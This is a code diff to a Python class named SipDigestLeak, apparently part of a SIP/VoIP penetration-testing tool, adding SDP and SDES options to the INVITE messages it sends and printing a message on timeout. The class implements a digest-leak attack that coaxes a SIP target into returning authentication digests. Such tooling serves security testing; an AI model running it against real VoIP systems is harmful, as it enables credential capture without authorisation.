@@ -54,12 +54,20 @@ class SipDigestLeak:
         self.ofile = ''
         self.user = ''
         self.pwd = ''
+        self.sdp = 0
+        self.sdes = 0
         self.verbose = 0
 
     def start(self):
         supported_protos = ['UDP', 'TCP', 'TLS']
 
         self.proto = self.proto.upper()
+
+        if self.sdes == 1:
+            self.sdp = 2
+
+        if self.sdp == None:
+            self.sdp = 0
 
         # check protocol
         if self.proto not in supported_protos:
@@ -127,7 +135,7 @@ class SipDigestLeak:
         tag = generate_random_string(8, 8, 'hex')
 
         msg = create_message('INVITE', self.contact_domain, self.from_user, self.from_name, self.from_domain,
-                             self.to_user, self.to_name, self.to_domain, proto, self.domain, self.user_agent, lport, branch, callid, tag, cseq, '', '', 1, '', 0, '', '')
+                             self.to_user, self.to_name, self.to_domain, proto, self.domain, self.user_agent, lport, branch, callid, tag, cseq, '', '', 1, '', self.sdp, '', '')
 
         print(YELLOW + '[=>] Request INVITE' + WHITE)
 
@@ -161,7 +169,7 @@ class SipDigestLeak:
                     resp = sock.recv(4096)
 
                 headers = parse_message(resp.decode())
-                
+
                 if headers:
                     via = headers['via']
                     rr = headers['rr']
@@ -229,7 +237,7 @@ class SipDigestLeak:
                     print(YELLOW + '[=>] Request INVITE' + WHITE)
 
                     msg = create_message('INVITE', self.contact_domain, self.from_user, self.from_name, self.from_domain, self.to_user, self.to_name, self.to_domain, self.proto,
-                                         self.domain, self.user_agent, lport, branch, callid, tag, cseq, '', digest, auth_type, '', 0, via, '')
+                                         self.domain, self.user_agent, lport, branch, callid, tag, cseq, '', digest, auth_type, '', self.sdp, via, '')
 
                     if self.verbose == 1:
                         print(BWHITE + '[+] Sending to %s:%s/%s ...' %
@@ -278,17 +286,19 @@ class SipDigestLeak:
                                     print(YELLOW + '[=>] Request ACK')
 
                                     msg = create_message('ACK', self.contact_domain, self.from_user, self.from_name, self.from_domain,
-                                                        self.to_user, self.to_name, self.to_domain, proto, self.domain, self.user_agent, lport, branch, callid, tag, cseq, totag, '', 1, '', 0, via, rr)
+                                                         self.to_user, self.to_name, self.to_domain, proto, self.domain, self.user_agent, lport, branch, callid, tag, cseq, totag, '', 1, '', 0, via, rr)
 
                                     if self.verbose == 1:
                                         print(BWHITE + '[+] Sending to %s:%s/%s ...' %
-                                            (self.ip, self.rport, self.proto))
+                                              (self.ip, self.rport, self.proto))
                                         print(YELLOW + msg + WHITE)
 
                                     if self.proto == 'TLS':
-                                        sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
+                                        sock_ssl.sendall(
+                                            bytes(msg[:8192], 'utf-8'))
                                     else:
-                                        sock.sendto(bytes(msg[:8192], 'utf-8'), host)
+                                        sock.sendto(
+                                            bytes(msg[:8192], 'utf-8'), host)
 
                     except:
                         print(WHITE)
@@ -419,6 +429,7 @@ class SipDigestLeak:
                 else:
                     print(BRED + 'No Auth Digest received :(\n' + WHITE)
         except socket.timeout:
+            print(BRED + 'No Auth Digest received :(\n' + WHITE)
             pass
         except:
             pass
